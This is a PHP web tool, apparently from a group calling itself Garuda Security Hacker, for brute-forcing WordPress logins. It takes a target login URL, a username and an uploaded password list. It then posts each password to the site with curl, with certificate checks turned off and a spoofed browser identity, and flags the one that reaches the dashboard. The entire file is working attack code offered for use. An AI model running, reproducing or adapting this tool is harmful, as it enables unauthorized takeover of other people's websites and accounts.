<?php
// ============================= //
# WordPress Brute Force
# Created by Lyonc
# Garuda Security Hacker
# Can Use On Localhost / cPanel
// ============================= //
error_reporting(0);
$logurl = $_POST['logurl'];
$user = $_POST['tguser'];
echo '<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WordPress Brute Force | Garuda Security Hacker</title>
</head>
<body>

<center>
';
if(isset($_POST['startbf']) && !empty($logurl) && !empty($user) && $_FILES['netfile']['size'] !== 0){
$textkskc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123457890';
$panj = 15;
$txtl = strlen($textkskc)-1;
$uploadz = '';
for($i=1; $i<=$panj; $i++){
$uploadz .= $textkskc[rand(0, $txtl)];
}
if(move_uploaded_file($_FILES['netfile']['tmp_name'], $uploadz)){
$passlists = file_get_contents($uploadz);
unlink($uploadz);
}else{
$passlists = '';
}
$listspass = explode("\n", $passlists);
if(isset($_POST['brift'])){
foreach($listspass as $pass){
if(logwp($logurl, urlencode($user), urlencode($pass))){
echo '<font color="blue">'.htmlspecialchars($pass).'</font> <font color="brown">=></font> <font color="green">True</font><br/>'."\n";
break;
}else{
echo '<font color="blue">'.htmlspecialchars($pass).'</font> <font color="brown">=></font> <font color="red">False</font><br/>'."\n";
}
}
}else{
foreach($listspass as $pass){
if(logwp($logurl, urlencode($user), urlencode($pass))){
echo '<font color="blue">'.htmlspecialchars($pass).'</font> <font color="brown">=></font> <font color="green">True</font><br/>'."\n";
}else{
echo '<font color="blue">'.htmlspecialchars($pass).'</font> <font color="brown">=></font> <font color="red">False</font><br/>'."\n";
}
}
}
}else{
echo '<form method="post" enctype="multipart/form-data">
<br>
<br>

<br><br><br>
<hr width="40%" height="10%" color="black">

<p><font size="10" color="white" style="text-shadow: 5px 5px 20px red;">WPBrute Force</font></p>

<font color="gray">Work On cPanel And Localhost</font><br/>
<b>Login Url</b><br/>
<input type="text" size="40" name="logurl" placeholder="Login Url" value="'.htmlspecialchars($user).'"><br/>
<b>Username</b><br/>
<input type="text" size="40" name="tguser" placeholder="Username" value="'.htmlspecialchars($user).'"><br/>
<b>Password Lists</b><br/>
<input type="file" name="netfile"><br/>
<input type="checkbox" name="brift" value="Break If True"><font color="blue">Break If True</font><br/>
<input type="submit" name="startbf" value="START">
</form>
<hr width="40%" height="10%" color="black">

';
}
echo '</center>
</body>';
function logwp($urllgz, $login_email, $login_pass){
$urllgm = explode('?redirect_to=', $urllgz);
$urllg = $urllgm[0];
$cookielog = 'gsh_cookie';
$fp = fopen($cookielog, 'w');
fwrite($fp, '');
fclose($fp);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urllg);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'log='.$login_email.'&pwd='.$login_pass.'&login=Log%20In');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookielog);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookielog);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3');
curl_setopt($ch, CURLOPT_REFERER, $urllg);
$page = curl_exec($ch) or die('<font color="red">Can\'t Connect to Host</font>');
if(eregi('\'#dashboard_stats div.dashboard-widget-content\'', $page)){
return TRUE;
}else{
return FALSE;
}
}
?>
<style type='text/css' media='screen'>
    body{ 

        background-color: #000000;
        background-content:HPH;
        background-attachment:fixed;
        background-position:bottom; 
	
}
hr {
 border:0;
 height:1px;
 background-image:linear-gradient(to right,rgba(0,0,0,0),rgb(255, 0, 0),rgba(0,0,0,0))
 }



</style>
<style type="text/css">
textarea {
    width: 500px;
    height: 200px;
    border: 1px solid #000000;
    margin: 5px auto;
    padding: 7px;
}
input[type=submit] {
    width: 500px;
    height: 25px;
    border: 1px solid #000000;
    background: transparent;
    margin: 5px auto;
    background: red;
    color: #ffffff;
    cursor: pointer;
}
</style>

